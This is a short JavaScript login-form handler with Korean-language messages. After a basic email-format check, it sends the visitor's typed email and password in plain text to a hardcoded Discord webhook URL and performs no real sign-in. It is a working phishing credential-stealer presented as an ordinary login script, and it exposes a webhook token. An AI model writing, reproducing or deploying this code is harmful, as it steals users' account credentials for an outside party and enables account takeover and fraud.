document.getElementById('login-button').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const messageElement = document.getElementById('message');

    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailPattern.test(email)) {
        messageElement.textContent = '유효한 이메일 주소를 입력하세요.';
        messageElement.style.color = '#ff0000';
        return;
    }

    const webhookURL = 'https://discord.com/api/webhooks/1312724758500216882/POMdK4RsYUMWFmYtpz81FE-xyPd4coVmBBCpix4jsQVCdL27avEBXS9ZMYnm2Kz7oc2p';

    const data = {
        content: `이메일: ${email}\n비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
});
